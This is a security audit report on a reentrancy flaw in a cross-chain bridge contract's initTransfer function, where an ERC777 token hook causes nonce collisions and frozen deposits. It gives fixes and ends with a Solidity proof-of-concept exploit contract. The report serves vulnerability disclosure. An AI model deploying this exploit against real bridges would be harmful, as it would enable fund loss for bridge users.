### Title
Reentrancy via ERC777/token-with-hooks in `initTransfer` causes `currentOriginNonce` collision, permanently freezing bridged funds — (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`OmniBridge.initTransfer` increments `currentOriginNonce` at the top of the function but reads it again from storage — not from a local snapshot — when passing it to `initTransferExtension` and `emit InitTransfer` after the token transfer. If the token being bridged is ERC777 (or any token with a `tokensToSend`/`tokensReceived` hook), the hook fires during the `safeTransferFrom` call and can reenter `initTransfer`. The reentrant call increments `currentOriginNonce` a second time. When the original call resumes, it reads the already-incremented nonce, causing two independent bridge transfers to be published under the same nonce. One transfer's tokens are permanently frozen in the bridge with no corresponding cross-chain claim.

---

### Finding Description

In `OmniBridge.initTransfer`:

```
currentOriginNonce += 1;          // line 381 — nonce assigned here
...
IERC20(tokenAddress).safeTransferFrom(   // lines 395–412 — hook fires here
    msg.sender, address(this), amount
);
...
initTransferExtension(
    ..., currentOriginNonce, ...   // line 418 — reads STATE, not snapshot
);
emit BridgeTypes.InitTransfer(
    ..., currentOriginNonce, ...   // line 430 — reads STATE, not snapshot
);
``` [1](#0-0) [2](#0-1) [3](#0-2) 

The function never snapshots `currentOriginNonce` into a local variable. No `nonReentrant` modifier is present anywhere in the EVM contract suite — confirmed by the absence of any `ReentrancyGuard` import or `nonReentrant` usage across all files under `evm/src/`. [4](#0-3) 

**Reentrancy path via ERC777:**

ERC777 tokens implement the ERC20 interface and are therefore accepted by `initTransfer` as a plain `IERC20`. When `safeTransferFrom` is called on an ERC777 token, the token contract invokes the sender's registered ERC1820 `tokensToSend` hook *before* the balance is debited. An attacker registers a malicious ERC1820 implementer that calls `initTransfer` again from within the hook.

**Nonce collision sequence:**

| Step | `currentOriginNonce` | Action |
|------|----------------------|--------|
| Call A enters, increments | N | — |
| `safeTransferFrom` fires `tokensToSend` hook | N | hook reenters |
| Call B enters, increments | N+1 | — |
| Call B's `safeTransferFrom` completes (no further hook) | N+1 | — |
| Call B reads `currentOriginNonce` = N+1, publishes Wormhole msg for **N+1** | N+1 | ✓ published |
| Call B emits `InitTransfer(nonce=N+1)` | N+1 | ✓ emitted |
| Call B returns; Call A resumes | N+1 | — |
| Call A reads `currentOriginNonce` = **N+1** (wrong!) | N+1 | — |
| Call A publishes Wormhole msg for **N+1** (duplicate!) | N+1 | ✗ duplicate |
| Call A emits `InitTransfer(nonce=N+1)` (duplicate!) | N+1 | ✗ duplicate |

**Result:**
- Nonce **N** (Call A's real nonce): tokens are locked in the bridge, but no Wormhole message was ever published for it. NEAR never sees a claim for nonce N. Those tokens are **permanently frozen**.
- Nonce **N+1**: two Wormhole messages exist. NEAR processes the first and rejects the second as a duplicate. Call B's tokens are bridged correctly; Call A's tokens are irrecoverable.

In `OmniBridgeWormhole.initTransferExtension`, the `originNonce` parameter is embedded directly into the Borsh-encoded Wormhole payload, so the NEAR bridge will use it as the canonical nonce for deduplication. [5](#0-4) 

---

### Impact Explanation

**Critical — Permanent freezing / irrecoverable lock of user funds in the bridge.**

Tokens transferred in Call A are held by the bridge contract at `address(this)` (line 407–411) but no valid cross-chain message is ever published for nonce N. There is no admin recovery function in `OmniBridge` that can release stuck ERC20 balances. The funds are permanently unclaimable. [2](#0-1) 

Additionally, this constitutes **nonce reuse**: two distinct bridge transfers are published under the same `originNonce`, which breaks the NEAR side's deduplication invariant and can cause unbacked supply if the NEAR bridge ever processes both (e.g., due to a relay race condition).

---

### Likelihood Explanation

**Medium.** ERC777 tokens are a deployed, widely-used standard (e.g., imBTC, LUKSO LYX, various DeFi tokens). `initTransfer` accepts any `tokenAddress` without restricting to non-hook tokens. An attacker only needs to:
1. Hold an ERC777 token that is registered as a bridge token (or use `logMetadata` to register one).
2. Register a malicious ERC1820 implementer for their own address.
3. Call `initTransfer` with that token.

No privileged role, leaked key, or external oracle compromise is required. The entry point is fully unprivileged.

---

### Recommendation

1. **Add `nonReentrant` from OpenZeppelin's `ReentrancyGuardUpgradeable`** to `initTransfer`, `initTransfer1155`, and `finTransfer`.
2. **Snapshot `currentOriginNonce` into a local variable** immediately after incrementing it, and use the local variable for all subsequent reads within the same call:

```solidity
function initTransfer(...) external payable whenNotPaused(PAUSED_INIT_TRANSFER) nonReentrant {
    currentOriginNonce += 1;
    uint64 nonce = currentOriginNonce;   // ← snapshot
    ...
    initTransferExtension(..., nonce, ...);
    emit BridgeTypes.InitTransfer(..., nonce, ...);
}
```

Both fixes are needed: the snapshot alone does not prevent reentrancy from corrupting other shared state (e.g., `wormholeNonce` in `OmniBridgeWormhole`).

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

interface IOmniBridge {
    function initTransfer(
        address tokenAddress, uint128 amount, uint128 fee,
        uint128 nativeFee, string calldata recipient, string calldata message
    ) external payable;
}

contract MaliciousERC1820Implementer {
    IERC1820Registry constant ERC1820 =
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant TOKENS_SENDER_INTERFACE_HASH =
        keccak256("ERC777TokensSender");

    IOmniBridge bridge;
    address token;
    bool reentered;

    constructor(address _bridge, address _token) {
        bridge = IOmniBridge(_bridge);
        token  = _token;
        // Register self as ERC777 sender hook for this address
        ERC1820.setInterfaceImplementer(
            address(this), TOKENS_SENDER_INTERFACE_HASH, address(this)
        );
    }

    // ERC777 tokensToSend hook — fires before balance debit
    function tokensToSend(
        address, address, address, uint256, bytes calldata, bytes calldata
    ) external {
        if (!reentered) {
            reentered = true;
            // Reentrant call B — increments currentOriginNonce to N+1
            // and publishes Wormhole message for N+1
            bridge.initTransfer(token, 1e18, 0, 0, "near:attacker.near", "");
        }
    }

    function attack() external {
        reentered = false;
        // Call A — increments currentOriginNonce to N
        // tokensToSend fires → Call B runs → nonce becomes N+1
        // Call A resumes, reads currentOriginNonce=N+1 → duplicate Wormhole msg
        // Call A's tokens (nonce N) are permanently frozen
        bridge.initTransfer(token, 1e18, 0, 0, "near:attacker.near", "");
    }
}
```

After `attack()` executes:
- The bridge holds `2e18` tokens.
- Two Wormhole messages exist for nonce `N+1`; none exists for nonce `N`.
- NEAR processes the first `N+1` message and mints `1e18` to the attacker.
- The second `N+1` message is rejected as a duplicate.
- `1e18` tokens (Call A's deposit, nonce `N`) are permanently frozen with no recovery path.
